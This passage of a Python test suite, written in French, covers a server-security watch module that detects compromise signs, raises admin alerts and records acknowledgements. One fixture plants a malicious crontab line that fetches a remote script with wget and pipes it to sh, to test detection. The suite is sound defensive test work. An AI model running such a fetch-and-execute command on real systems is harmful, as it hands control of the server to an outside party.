        brut = json.dumps(donnees or {}).encode()
        return {'HTTP_X_AXIORHUB_USER': compte, 'HTTP_X_AXIORHUB_ROLE': role, 'HTTP_ORIGIN': ORIGINE, 'HTTP_X_CSRF_TOKEN': JETON,
                'CONTENT_TYPE': 'application/json', 'CONTENT_LENGTH': str(len(brut)), 'wsgi.input': io.BytesIO(brut), 'REQUEST_METHOD': methode}

    def api(self, nom, donnees=None, role='administrateur', methode='POST'):
        from agent import web440
        out = web440.api(self.env(role, donnees=donnees, methode=methode), self.desk, {'origin': ORIGINE, 'csrf': JETON}, '/p', nom, {}, methode)
        return out, json.loads(out['body'])

    def page(self, role='administrateur', args=None, auth=None):
        from agent import web440
        env = {'HTTP_X_AXIORHUB_USER': 'cabinet', 'HTTP_X_AXIORHUB_ROLE': role, 'REQUEST_METHOD': 'GET'}
        return web440.route(env, self.f.c, auth or {'origin': ORIGINE, 'csrf': JETON}, '/p', '/securite-serveur', args or {}, 'GET')

    def empreinte_base(self):
        lignes = []
        for table in ('secu56101_constats', 'secu56101_rapports', 'secu56101_accuses', 'secu56101_fiches', 'secu56101_cles', 'settings', 'audit'):
            lignes += [tuple(r) for r in self.desk.db.execute('SELECT * FROM %s' % table)]
        return lignes

    def test_ingestion_constats_alerte_bandeau_et_telephone(self):
        self.rapport()
        self.assertEqual(s.nombre_alerte(self.desk), 0)                          # rien avant l'analyse de la maintenance
        self.assertEqual(s.ingerer(self.desk)['nouveaux'], 1)
        self.assertEqual(s.ingerer(self.desk)['etat'], 'inchange')
        n = s.nombre_alerte(self.desk)
        self.assertGreaterEqual(n, 4)
        self.assertEqual(mobile490.counts(self.desk)['securite'], n)
        self.assertTrue(mobile490.neutral_text(mobile490.counts(self.desk)).startswith('Alerte de sécurité du serveur'))
        self.assertNotIn('linuxsys', json.dumps(mobile490.summary(self.desk), ensure_ascii=False))   # aucun détail au téléphone
        bandeau = s.bandeau_html(self.desk, '/p', 'cabinet', 'administrateur')
        self.assertIn('Alerte de sécurité du serveur', bandeau)
        self.assertIn('/p/securite-serveur', bandeau)
        self.assertEqual(s.bandeau_html(self.desk, '/p', 'avocat@example.test', 'avocat'), '')
        self.assertEqual(s.bandeau_html(self.desk, '/p', 'assistant@example.test', 'assistant'), '')
        debut = time.perf_counter()
        for _ in range(20):
            s.bandeau_html(self.desk, '/p', 'cabinet', 'administrateur')
        self.assertLess((time.perf_counter() - debut) / 20, 0.005)               # contrat : < 5 ms
        with patch.object(s, 'plateforme', lambda auth=None: 'windows'):
            self.assertEqual(s.bandeau_html(self.desk, '/p', 'cabinet', 'administrateur'), '')
            self.assertEqual(mobile490.counts(self.desk)['securite'], 0)

    def test_S_U3_telephone_signal_sur_hausse_et_pas_plus_d_une_fois_par_heure(self):
        if not mobile490.vapid_available():
            self.skipTest('cryptography absent')
        self.desk.setting('mobile490:push', True)
        envoyes = []
        mobile490.ensure_schema(self.desk)
        self.desk.db.execute("INSERT INTO push_subs490(id,endpoint,label,created) VALUES('a','https://fcm.googleapis.com/x','tel','2026-01-01')")
        self.desk.db.commit()
        with patch.object(mobile490, 'http_post', lambda url, headers: envoyes.append(url) or 201):
            mobile490.dispatch(self.desk, force=True)
            envoyes.clear()
            self.assertEqual(mobile490.dispatch(self.desk, now=time.time() + 400)['reason'], 'rien_de_nouveau')
            self.rapport()
            s.ingerer(self.desk)
            self.assertEqual(mobile490.dispatch(self.desk, now=time.time() + 800)['reason'], 'ok')   # hausse : signal vide
            self.assertEqual(len(envoyes), 1)
            # le constat disparaît puis revient dans l'heure : le nombre ne monte pas, aucun nouveau signal
            (self.r.base / 'var/spool/cron/crontabs/www-data').unlink()
            avant = s.nombre_alerte(self.desk)
            V.passer(self.r.fin(), 'complet', time.time() + 60, {80: self.http.server_address[1]}, True, sortie=self.dossier)
            s.ingerer(self.desk)
            self.assertEqual(s.constat(self.desk, 'S05:crontab|www-data')['etat'], 'resolu')
            self.assertEqual(s.nombre_alerte(self.desk), avant)
            incident(self.r)
            V.passer(self.r.fin(), 'complet', time.time() + 120, {80: self.http.server_address[1]}, True, sortie=self.dossier)
            s.ingerer(self.desk)
            self.assertEqual(s.constat(self.desk, 'S05:crontab|www-data')['etat'], 'ouvert')
            self.assertEqual(mobile490.counts(self.desk)['securite'], avant)     # la clé « securite » ne monte pas : pas de signal pour elle
            self.assertLessEqual(mobile490.counts(self.desk)['securite'], self.desk.settings('mobile490:last_counts')['securite'])

    def test_V101_06_page_administrateur_constats_et_commandes(self):
        self.rapport()
        s.ingerer(self.desk)
        out = self.page()
        self.assertEqual(out['status'], '200 OK')
        self.assertIn(('Cache-Control', 'private, no-store'), out['headers'])
        html = out['body']
        self.assertIn('Sécurité du serveur', html)
        self.assertIn('s101-rouge', html)
        self.assertIn('Programme de minage probable : linuxsys', html)
        self.assertIn('data-s101-copier', html)
        self.assertIn('sudo crontab -u www-data -r', html)
        self.assertIn('Marquer comme connu', html)
        self.assertIn('Historique sur 30 jours', html)
        self.assertIn('Résumé des sept derniers jours', html)
        self.assertIn('/static/v56101-securite.js', html)
        self.assertNotIn(SECRET_CMD, html)
        self.assertNotIn('<script>', html.split('<body', 1)[1].replace('<script defer', ''))   # aucun script en ligne ajouté

    def test_V101_06_collaborateur_ni_page_ni_route_404(self):
        from agent import standalone_auth
        self.rapport()
        s.ingerer(self.desk)
        for role in ('avocat', 'assistant'):
            self.assertIsNone(self.page(role))                                  # même réponse qu'une page absente
            out, corps = self.api('m56101/securite/connu', {'cle': 'S04:x', 'empreinte': 'x', 'motif': 'motif', 'idem': 'cle-00000001'}, role)
            self.assertEqual(out['status'], '404 Not Found')
            self.assertFalse(standalone_auth.allowed(role, 'POST', '/api440/m56101/securite/connu'))
            self.assertTrue(standalone_auth.allowed(role, 'GET', '/securite-serveur'))   # le refus vient de la page : 404 neutre
        self.assertTrue(standalone_auth.allowed('administrateur', 'POST', '/api440/m56101/securite/connu'))
        self.assertFalse(sw.allowed('administrateur', 'POST', 'm56101/securite/executer'))   # liste fermée

    def test_poste_page_non_disponible(self):
        with patch.object(s, 'plateforme', lambda auth=None: 'windows'):
            out = self.page()
        self.assertEqual(out['status'], '200 OK')
        self.assertIn('Non disponible sur ce poste', out['body'])
        with patch.object(s, 'plateforme', lambda auth=None: 'poste' if (auth or {}).get('poste') else 'serveur'):   # moteur local (« poste »)
            out = self.page(auth={'origin': ORIGINE, 'csrf': JETON, 'poste': True})
        self.assertIn('Non disponible sur ce poste', out['body'])

    def test_R05_affichage_sans_ecriture(self):
        self.rapport()
        s.ingerer(self.desk)
        self.rapport()                                                           # rapport plus récent, pas encore analysé
        self.page()
        mobile490.summary(self.desk)   # premier appel : migrations ponctuelles d'autres modules de la file (bouclier5668, connexions5653, savoir5665)
        avant = self.empreinte_base()
        self.assertEqual(self.page()['status'], '200 OK')
        out, _ = self.api('m56101/securite/etat', methode='GET')
        self.assertEqual(out['status'], '200 OK')
        s.bandeau_html(self.desk, '/p', 'cabinet', 'administrateur')
        mobile490.summary(self.desk)
        self.assertEqual(self.empreinte_base(), avant)

    def test_V101_06_marquer_comme_connu_motif_obligatoire_audit_et_retour_si_empreinte_change(self):
        self.rapport()
        s.ingerer(self.desk)
        c = s.constat(self.desk, 'S05:crontab|www-data')
        out, corps = self.api('m56101/securite/connu', {'cle': c['cle'], 'empreinte': c['empreinte'], 'motif': ' ', 'idem': 'cle-00000002'})
        self.assertEqual((out['status'], corps['error']), ('422 Unprocessable Entity', 'motif_requis'))
        out, corps = self.api('m56101/securite/connu', {'cle': c['cle'], 'empreinte': '0' * 64, 'motif': 'Tâche connue', 'idem': 'cle-00000003'})
        self.assertEqual(out['status'], '409 Conflict')
        avant = s.nombre_alerte(self.desk)
        out, corps = self.api('m56101/securite/connu', {'cle': c['cle'], 'empreinte': c['empreinte'], 'motif': 'Tâche du prestataire, vérifiée', 'idem': 'cle-00000004'})
        self.assertEqual(out['status'], '200 OK', corps)
        self.assertIn(('Cache-Control', 'private, no-store'), out['headers'])
        again, corps2 = self.api('m56101/securite/connu', {'cle': c['cle'], 'empreinte': c['empreinte'], 'motif': 'Tâche du prestataire, vérifiée', 'idem': 'cle-00000004'})
        self.assertEqual(corps2, corps)                                          # même clé : même résultat, une seule écriture
        audit = [json.loads(r[0]) for r in self.desk.db.execute("SELECT data FROM audit WHERE action='securite_serveur_connu'")]
        self.assertEqual(len(audit), 1)
        self.assertEqual(audit[0]['motif'], 'Tâche du prestataire, vérifiée')
        self.assertEqual(s.nombre_alerte(self.desk), avant - 1)
        self.assertNotIn(c['cle'], [x['cle'] for x in s.constats(self.desk)])
        self.assertIn(c['cle'], [x['cle'] for x in s.constats(self.desk, connus=True)])
        # la tâche change : nouvelle empreinte, le constat revient et compte de nouveau
        self.r.f('/var/spool/cron/crontabs/www-data', '*/5 * * * * wget -qO- http://%s/y.sh | sh\n' % EXTERIEURE)
        V.passer(self.r.fin(), 'complet', time.time() + 60, {80: self.http.server_address[1]}, True, sortie=self.dossier)
        s.ingerer(self.desk)
        self.assertIn(c['cle'], [x['cle'] for x in s.constats(self.desk)])

    def test_garde_motif_mutation(self):
        """Contre-exemple : sans le contrôle du motif, un accusé vide passerait (le test ci-dessus échouerait)."""
        self.rapport()
        s.ingerer(self.desk)
        c = s.constat(self.desk, 'S05:crontab|www-data')
        with self.assertRaises(Stop):
            s.marquer_connu(self.desk, 'cabinet', 'administrateur', c['cle'], c['empreinte'], '', 'cle-00000005')
        source = Path(s.__file__).read_text(encoding='utf-8')
        mutant = source.replace("    if len(motif) < 3:\n        raise Stop('motif_requis')\n", '')
        self.assertNotEqual(mutant, source)
        espace = {'__name__': 'agent.securite56101_mutant', '__package__': 'agent'}
        exec(compile(mutant, 'mutant', 'exec'), espace)
        espace['plateforme'] = lambda auth=None: 'serveur'
        self.assertEqual(espace['marquer_connu'](self.desk, 'cabinet', 'administrateur', c['cle'], c['empreinte'], '', 'cle-00000006')['etat'], 'connu')

    def test_S_U3_importants_dans_a_decider_administrateur_seulement(self):
        serveur_sain(self.r)
        self.r.f('/etc/cron.deny', '')
        V.passer(self.r.fin(), 'complet', time.time(), {80: self.http.server_address[1]}, False, sortie=self.dossier)
        s.ingerer(self.desk)
        admin = s.queue_items(self.desk, '/p', 'cabinet', 'administrateur')
        self.assertEqual([x['class'] for x in admin], ['securite_serveur'])
        self.assertIn('cron.deny', admin[0]['title'])
        self.assertEqual(s.queue_items(self.desk, '/p', 'avocat@example.test', 'avocat'), [])
        from agent import file5651
        cles = [x['class'] for x in file5651.items(self.desk, '/p', None, '', frozenset(), actor='cabinet', role='administrateur')]
        self.assertIn('securite_serveur', cles)
        cles = [x['class'] for x in file5651.items(self.desk, '/p', None, '', frozenset(), actor='avocat@example.test', role='avocat')]
        self.assertNotIn('securite_serveur', cles)
        self.assertEqual(s.bandeau_html(self.desk, '/p', 'cabinet', 'administrateur'), '')   # important : pas de bandeau rouge

    def test_S_U4_fiche_d_incident_brouillon_jamais_envoye(self):
        self.rapport()
        s.ingerer(self.desk)
        with patch('socket.socket.connect', side_effect=AssertionError('connexion interdite')):
            out, corps = self.api('m56101/securite/fiche', {'mesures': ['processus', 'tache', 'inconnue'], 'idem': 'cle-00000007'})
        self.assertEqual(out['status'], '200 OK', corps)
        f = s.fiche(self.desk, corps['id'])
        self.assertIn('article 33.5', f['texte'])
        self.assertIn('Programme de minage probable', f['texte'])
        self.assertIn('Programme suspect arrêté', f['texte'])
        self.assertNotIn('inconnue', f['mesures'])
        items = s.queue_items(self.desk, '/p', 'cabinet', 'administrateur')
        self.assertIn('fiche_incident', [x['class'] for x in items])
        self.assertIn('Texte du brouillon', self.page(args={'fiche': corps['id']})['body'])

    def test_S_A4_desactivation_depose_une_demande_sans_systemctl(self):
        import subprocess
        with patch.object(subprocess, 'run', side_effect=AssertionError('aucune commande système')), \
                patch.object(subprocess, 'Popen', side_effect=AssertionError('aucune commande système')):
            out, corps = self.api('m56101/securite/veille', {'action': 'desactiver', 'idem': 'cle-00000008'})
        self.assertEqual(out['status'], '200 OK', corps)
        demande = json.loads((Path(self.f.c['state_dir']) / 'securite-demande' / 'demande.json').read_text(encoding='utf-8'))
        self.assertEqual(demande['action'], 'desactiver')
        self.assertEqual(s.etat(self.desk)['demande'], 'en_attente')
        out, corps = self.api('m56101/securite/veille', {'action': 'rm', 'idem': 'cle-00000009'})
        self.assertEqual(out['status'], '422 Unprocessable Entity')
        self.assertTrue(self.desk.db.execute("SELECT 1 FROM audit WHERE action='securite_serveur_veille'").fetchone())

    def test_S_U2_veille_arretee_si_rapport_ancien(self):
        self.rapport(maintenant=time.time() - 3600)
        s.ingerer(self.desk)
        self.assertTrue(s.etat(self.desk)['arretee'])
        self.assertIn('Veille arrêtée ?', self.page()['body'])
        self.rapport()
        s.ingerer(self.desk)
        self.assertFalse(s.etat(self.desk)['arretee'])

    def test_csrf_et_origine_exiges(self):
        from agent import web440
        env = self.env(donnees={'action': 'desactiver', 'idem': 'cle-00000010'})
        env['HTTP_X_CSRF_TOKEN'] = 'faux'
        out = web440.api(env, self.desk, {'origin': ORIGINE, 'csrf': JETON}, '/p', 'm56101/securite/veille', {}, 'POST')
        self.assertEqual(out['status'], '403 Forbidden')
        self.assertFalse((Path(self.f.c['state_dir']) / 'securite-demande' / 'demande.json').exists())


if __name__ == '__main__':
    unittest.main()
